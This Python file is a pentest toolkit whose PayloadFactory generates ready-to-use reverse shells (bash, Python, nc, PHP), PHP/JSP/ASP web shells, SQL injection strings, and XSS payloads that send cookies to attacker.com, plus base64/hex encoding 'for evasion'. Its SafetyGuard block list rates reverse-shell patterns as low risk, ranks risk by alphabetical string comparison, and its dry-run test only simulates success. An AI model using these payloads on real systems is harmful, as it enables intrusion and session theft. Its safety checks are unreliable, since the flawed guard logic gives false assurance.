"""
DRAKBEN Security Toolkit
Author: @drak_ben
Description: 5 modules for safety, testing, pentesting, payloads, and reporting
"""

import os
import json
import base64
import hashlib
from datetime import datetime
from typing import Dict, List, Optional
from dataclasses import dataclass, asdict
from enum import Enum


class RiskLevel(Enum):
    """Risk levels for commands"""
    SAFE = "safe"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


@dataclass
class SafetyCheckResult:
    """Result of safety check"""
    safe: bool
    risk_level: RiskLevel
    warnings: List[str]
    blocked_reason: Optional[str]


@dataclass
class TestResult:
    """Result of sandbox test"""
    passed: bool
    output: str
    errors: List[str]
    safe_to_deploy: bool


# ====================
# MODULE 1: SafetyGuard
# ====================
class SafetyGuard:
    """Prevents dangerous operations and checks command safety"""
    
    def __init__(self):
        self.blocked_patterns = [
            r"rm\s+-rf\s+/",  # Delete root
            r"dd\s+if=.*of=/dev/sd",  # Disk write
            r"mkfs\.",  # Format filesystem
            r":(){.*};:",  # Fork bomb
            r"chmod\s+-R\s+777",  # Insecure permissions
            r">/dev/sd",  # Write to disk
            r"shutdown",  # System shutdown
            r"reboot",  # System reboot
            r"init\s+0",  # Halt system
        ]
        
        self.risky_patterns = {
            RiskLevel.HIGH: [
                r"rm\s+-rf",
                r"DROP\s+DATABASE",
                r"DROP\s+TABLE",
                r"DELETE\s+FROM.*WHERE.*1=1",
                r"chown\s+-R",
                r"chmod\s+777"
            ],
            RiskLevel.MEDIUM: [
                r"sudo",
                r"curl.*\|\s*bash",
                r"wget.*\|\s*sh",
                r"eval",
                r"exec"
            ],
            RiskLevel.LOW: [
                r"nc\s+-e",
                r"bash\s+-i",
                r"/dev/tcp"
            ]
        }
    
    def check_safety(self, command: str, target: Optional[str] = None) -> SafetyCheckResult:
        """Check if command is safe to execute"""
        warnings = []
        blocked_reason = None
        risk_level = RiskLevel.SAFE
        
        import re
        
        # Check blocked patterns
        for pattern in self.blocked_patterns:
            if re.search(pattern, command, re.IGNORECASE):
                blocked_reason = f"Command matches dangerous pattern: {pattern}"
                return SafetyCheckResult(
                    safe=False,
                    risk_level=RiskLevel.CRITICAL,
                    warnings=[],
                    blocked_reason=blocked_reason
                )
        
        # Check risky patterns
        for level, patterns in self.risky_patterns.items():
            for pattern in patterns:
                if re.search(pattern, command, re.IGNORECASE):
                    if level.value > risk_level.value:
                        risk_level = level
                    warnings.append(f"Command contains risky pattern: {pattern}")
        
        # Additional checks
        if target:
            if self._is_internal_target(target):
                warnings.append(f"Target appears to be internal/private: {target}")
                if risk_level == RiskLevel.SAFE:
                    risk_level = RiskLevel.LOW
        
        # Command-specific checks
        if "nmap" in command and "-A" in command:
            warnings.append("Aggressive scan may be detected")
        
        if "sqlmap" in command and "--os-shell" in command:
            warnings.append("Attempting to get OS shell is highly intrusive")
            risk_level = RiskLevel.HIGH
        
        return SafetyCheckResult(
            safe=True,
            risk_level=risk_level,
            warnings=warnings,
            blocked_reason=None
        )
    
    def _is_internal_target(self, target: str) -> bool:
        """Check if target is internal/private IP"""
        import re
        # Check private IP ranges
        private_patterns = [
            r"^10\.",
            r"^172\.(1[6-9]|2[0-9]|3[0-1])\.",
            r"^192\.168\.",
            r"^127\.",
            r"^localhost$"
        ]
        
        for pattern in private_patterns:
            if re.match(pattern, target):
                return True
        return False
    
    def require_approval(self, risk_level: RiskLevel) -> bool:
        """Determine if command requires user approval"""
        return risk_level in [RiskLevel.MEDIUM, RiskLevel.HIGH, RiskLevel.CRITICAL]


# ====================
# MODULE 2: SandboxTester
# ====================
class SandboxTester:
    """Tests commands in safe environment before deployment"""
    
    def __init__(self):
        self.test_history: List[TestResult] = []
    
    def test_command_syntax(self, command: str) -> TestResult:
        """Test if command has valid syntax"""
        errors = []
        
        # Basic syntax checks
        if not command.strip():
            errors.append("Empty command")
        
        # Check for unmatched quotes
        if command.count('"') % 2 != 0:
            errors.append("Unmatched double quotes")
        if command.count("'") % 2 != 0:
            errors.append("Unmatched single quotes")
        
        # Check for unmatched brackets
        if command.count('(') != command.count(')'):
            errors.append("Unmatched parentheses")
        if command.count('[') != command.count(']'):
            errors.append("Unmatched brackets")
        
        passed = len(errors) == 0
        
        result = TestResult(
            passed=passed,
            output="Syntax check completed",
            errors=errors,
            safe_to_deploy=passed
        )
        
        self.test_history.append(result)
        return result
    
    def test_dry_run(self, command: str) -> TestResult:
        """Test command with --dry-run or similar"""
        errors = []
        output = ""
        
        # Add dry-run flags if possible
        if "apt" in command:
            test_cmd = command.replace("install", "install --dry-run")
        elif "yum" in command:
            test_cmd = command + " --assumeno"
        elif "pip" in command:
            test_cmd = command + " --dry-run"
        else:
            # Can't dry-run this command
            return TestResult(
                passed=True,
                output="Dry-run not available for this command",
                errors=[],
                safe_to_deploy=True
            )
        
        # In real implementation, execute dry-run
        # For now, simulate success
        passed = True
        output = f"Dry-run simulation: {test_cmd}"
        
        result = TestResult(
            passed=passed,
            output=output,
            errors=errors,
            safe_to_deploy=passed
        )
        
        self.test_history.append(result)
        return result
    
    def test_prerequisites(self, command: str, required_tools: List[str]) -> TestResult:
        """Test if prerequisites are available"""
        errors = []
        
        import shutil
        for tool in required_tools:
            if not shutil.which(tool):
                errors.append(f"Missing required tool: {tool}")
        
        passed = len(errors) == 0
        
        result = TestResult(
            passed=passed,
            output=f"Checked {len(required_tools)} prerequisites",
            errors=errors,
            safe_to_deploy=passed
        )
        
        self.test_history.append(result)
        return result


# ====================
# MODULE 3: PentestToolkit
# ====================
class PentestToolkit:
    """Consolidated pentest tool wrappers and utilities"""
    
    def __init__(self):
        self.tools_available = {}
        self._scan_tools()
    
    def _scan_tools(self):
        """Scan for available tools"""
        import shutil
        common_tools = [
            "nmap", "masscan", "rustscan",
            "sqlmap", "nikto", "gobuster", "dirb",
            "hydra", "john", "hashcat",
            "msfconsole", "msfvenom",
            "netcat", "nc", "curl", "wget"
        ]
        
        for tool in common_tools:
            self.tools_available[tool] = shutil.which(tool) is not None
    
    def quick_scan(self, target: str) -> str:
        """Generate quick port scan command"""
        if self.tools_available.get("rustscan"):
            return f"rustscan -a {target} --ulimit 5000"
        elif self.tools_available.get("masscan"):
            return f"masscan {target} -p1-65535 --rate=1000"
        else:
            return f"nmap -T4 -F {target}"
    
    def vulnerability_scan(self, target: str) -> str:
        """Generate vulnerability scan command"""
        if self.tools_available.get("nmap"):
            return f"nmap -sV --script=vuln {target}"
        return f"nikto -h {target}"
    
    def web_discovery(self, url: str) -> str:
        """Generate web directory discovery command"""
        if self.tools_available.get("gobuster"):
            return f"gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt"
        elif self.tools_available.get("dirb"):
            return f"dirb {url}"
        else:
            return f"curl -s {url}/robots.txt"
    
    def sql_injection_test(self, url: str) -> str:
        """Generate SQL injection test command"""
        if self.tools_available.get("sqlmap"):
            return f"sqlmap -u '{url}' --batch --level=1"
        else:
            return f"curl -s '{url}' -d \"' OR '1'='1\""
    
    def password_crack(self, hash_file: str, hash_type: str = "md5") -> str:
        """Generate password cracking command"""
        if self.tools_available.get("hashcat"):
            return f"hashcat -m 0 {hash_file} /usr/share/wordlists/rockyou.txt"
        elif self.tools_available.get("john"):
            return f"john --format=raw-md5 {hash_file}"
        else:
            return "# No password cracking tools available"
    
    def get_available_tools(self) -> Dict[str, bool]:
        """Get list of available tools"""
        return self.tools_available.copy()


# ====================
# MODULE 4: PayloadFactory
# ====================
class PayloadFactory:
    """Generates various payloads and exploits"""
    
    def reverse_shell(self, lhost: str, lport: int, shell_type: str = "bash") -> str:
        """Generate reverse shell payload"""
        
        if shell_type == "bash":
            return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        
        elif shell_type == "python":
            return f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
        
        elif shell_type == "nc":
            return f"nc -e /bin/sh {lhost} {lport}"
        
        elif shell_type == "php":
            return f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        
        return f"# Unknown shell type: {shell_type}"
    
    def web_shell(self, shell_type: str = "php") -> str:
        """Generate web shell"""
        
        if shell_type == "php":
            return "<?php if(isset($_REQUEST['cmd'])){ echo shell_exec($_REQUEST['cmd']); } ?>"
        
        elif shell_type == "jsp":
            return """<%@ page import="java.util.*,java.io.*"%>
<% Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));
OutputStream os=p.getOutputStream();InputStream in=p.getInputStream(); %>"""
        
        elif shell_type == "asp":
            return """<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = Request.Form("cmd")
Execute szCMD
%>"""
        
        return f"# Unknown web shell type: {shell_type}"
    
    def sql_injection_payload(self, injection_type: str = "union") -> List[str]:
        """Generate SQL injection payloads"""
        
        if injection_type == "union":
            return [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT username,password FROM users--"
            ]
        
        elif injection_type == "boolean":
            return [
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR 1=1--",
                "admin' --",
                "admin' #"
            ]
        
        elif injection_type == "time":
            return [
                "'; WAITFOR DELAY '00:00:05'--",
                "'; SELECT SLEEP(5)--",
                "'; SELECT pg_sleep(5)--"
            ]
        
        return []
    
    def xss_payload(self, payload_type: str = "basic") -> List[str]:
        """Generate XSS payloads"""
        
        if payload_type == "basic":
            return [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')"
            ]
        
        elif payload_type == "advanced":
            return [
                "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
                "<img src=x onerror=this.src='http://attacker.com/?c='+document.cookie>",
                "<script>new Image().src='http://attacker.com/?c='+document.cookie</script>"
            ]
        
        return []
    
    def encode_payload(self, payload: str, encoding: str = "base64") -> str:
        """Encode payload for evasion"""
        
        if encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        
        elif encoding == "url":
            import urllib.parse
            return urllib.parse.quote(payload)
        
        elif encoding == "hex":
            return payload.encode().hex()
        
        return payload


# ====================
# MODULE 5: ReportGenerator
# ====================
class ReportGenerator:
    """Generates comprehensive reports"""
    
    def __init__(self):
        self.report_data = {
            "scan_results": [],
            "vulnerabilities": [],
            "recommendations": [],
            "timeline": []
        }
    
    def add_scan_result(self, tool: str, target: str, result: Dict):
        """Add scan result to report"""
        self.report_data["scan_results"].append({
            "timestamp": datetime.now().isoformat(),
            "tool": tool,
            "target": target,
            "result": result
        })
    
    def add_vulnerability(self, vuln_type: str, severity: str, description: str):
        """Add vulnerability to report"""
        self.report_data["vulnerabilities"].append({
            "type": vuln_type,
            "severity": severity,
            "description": description,
            "discovered": datetime.now().isoformat()
        })
    
    def add_recommendation(self, recommendation: str, priority: str = "medium"):
        """Add recommendation to report"""
        self.report_data["recommendations"].append({
            "text": recommendation,
            "priority": priority
        })
    
    def generate_markdown_report(self) -> str:
        """Generate markdown format report"""
        report = "# DRAKBEN Penetration Test Report\n\n"
        report += f"**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        
        # Executive Summary
        report += "## Executive Summary\n\n"
        report += f"- Total Scans: {len(self.report_data['scan_results'])}\n"
        report += f"- Vulnerabilities Found: {len(self.report_data['vulnerabilities'])}\n"
        report += f"- Recommendations: {len(self.report_data['recommendations'])}\n\n"
        
        # Vulnerabilities
        if self.report_data["vulnerabilities"]:
            report += "## Vulnerabilities\n\n"
            for vuln in self.report_data["vulnerabilities"]:
                report += f"### {vuln['type']} (Severity: {vuln['severity']})\n"
                report += f"{vuln['description']}\n\n"
        
        # Scan Results
        if self.report_data["scan_results"]:
            report += "## Scan Results\n\n"
            for scan in self.report_data["scan_results"]:
                report += f"### {scan['tool']} - {scan['target']}\n"
                report += f"**Time:** {scan['timestamp']}\n\n"
                report += "```\n"
                report += json.dumps(scan['result'], indent=2)
                report += "\n```\n\n"
        
        # Recommendations
        if self.report_data["recommendations"]:
            report += "## Recommendations\n\n"
            for rec in self.report_data["recommendations"]:
                report += f"- **[{rec['priority'].upper()}]** {rec['text']}\n"
        
        return report
    
    def generate_json_report(self) -> str:
        """Generate JSON format report"""
        report = {
            "generated": datetime.now().isoformat(),
            "summary": {
                "total_scans": len(self.report_data['scan_results']),
                "total_vulnerabilities": len(self.report_data['vulnerabilities']),
                "total_recommendations": len(self.report_data['recommendations'])
            },
            "data": self.report_data
        }
        return json.dumps(report, indent=2)
    
    def save_report(self, filename: str, format: str = "markdown"):
        """Save report to file"""
        if format == "markdown":
            content = self.generate_markdown_report()
            ext = ".md"
        else:
            content = self.generate_json_report()
            ext = ".json"
        
        filepath = filename if filename.endswith(ext) else filename + ext
        
        with open(filepath, "w") as f:
            f.write(content)
        
        return filepath


# ====================
# UNIFIED FACADE
# ====================
class SecurityToolkit:
    """Main facade combining all 5 security modules"""
    
    def __init__(self):
        self.guard = SafetyGuard()
        self.tester = SandboxTester()
        self.toolkit = PentestToolkit()
        self.payload_factory = PayloadFactory()
        self.reporter = ReportGenerator()
    
    def safe_execute_check(self, command: str, target: Optional[str] = None) -> Dict:
        """Check if command is safe before execution"""
        safety = self.guard.check_safety(command, target)
        syntax = self.tester.test_command_syntax(command)
        
        return {
            "safe": safety.safe and syntax.passed,
            "safety_check": asdict(safety),
            "syntax_check": asdict(syntax),
            "requires_approval": self.guard.require_approval(safety.risk_level)
        }
    
    def generate_pentest_workflow(self, target: str) -> List[Dict]:
        """Generate complete pentest workflow"""
        workflow = []
        
        # Phase 1: Reconnaissance
        workflow.append({
            "phase": "reconnaissance",
            "command": self.toolkit.quick_scan(target),
            "description": "Quick port scan"
        })
        
        # Phase 2: Vulnerability Scan
        workflow.append({
            "phase": "vulnerability_scan",
            "command": self.toolkit.vulnerability_scan(target),
            "description": "Vulnerability detection"
        })
        
        # Phase 3: Web Discovery (if web server)
        workflow.append({
            "phase": "web_discovery",
            "command": self.toolkit.web_discovery(f"http://{target}"),
            "description": "Web directory enumeration"
        })
        
        return workflow
    
    def get_toolkit_summary(self) -> Dict:
        """Get summary of toolkit status"""
        return {
            "available_tools": self.toolkit.get_available_tools(),
            "test_history": len(self.tester.test_history),
            "scan_results": len(self.reporter.report_data["scan_results"]),
            "vulnerabilities": len(self.reporter.report_data["vulnerabilities"])
        }
